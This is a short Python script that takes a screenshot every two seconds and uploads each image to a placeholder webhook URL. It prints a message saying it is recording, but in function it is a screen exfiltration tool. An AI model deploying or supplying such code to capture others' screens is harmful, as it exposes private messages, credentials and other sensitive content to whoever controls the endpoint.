import subprocess
import sys
import time
import io
import pyautogui
import numpy as np
import requests
from PIL import Image

def install_packages():
    """Install required packages."""
    requirements = [
        'pyautogui',
        'requests',
        'numpy',
        'Pillow'
    ]
    for package in requirements:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def send_image_to_webhook(image_bytes):
    """Send the image to a webhook."""
    webhook_url = 'YOUR_WEBHOOK_URL'
    files = {'file': ('screenshot.png', image_bytes, 'image/png')}
    response = requests.post(webhook_url, files=files)
    if response.status_code == 200:
        print("Image successfully sent to webhook.")
    else:
        print(f"Failed to send image to webhook. Status code: {response.status_code}")

def main():
    try:
        import pyautogui
        import requests
        import numpy as np
        from PIL import Image
    except ImportError:
        print("Required packages are not installed. Installing...")
        install_packages()
        import pyautogui
        import requests
        import numpy as np
        from PIL import Image

    print("Recording... Press Ctrl+C to stop.")

    try:
        while True:
            # Take a screenshot
            img = pyautogui.screenshot()

            # Convert the image to a bytes object
            with io.BytesIO() as buffer:
                img.save(buffer, format="PNG")
                image_bytes = buffer.getvalue()

            # Send the image to the webhook
            send_image_to_webhook(image_bytes)

            # Wait for 2 seconds before taking the next screenshot
            time.sleep(2)
    except KeyboardInterrupt:
        print("Recording stopped.")

if __name__ == "__main__":
    main()
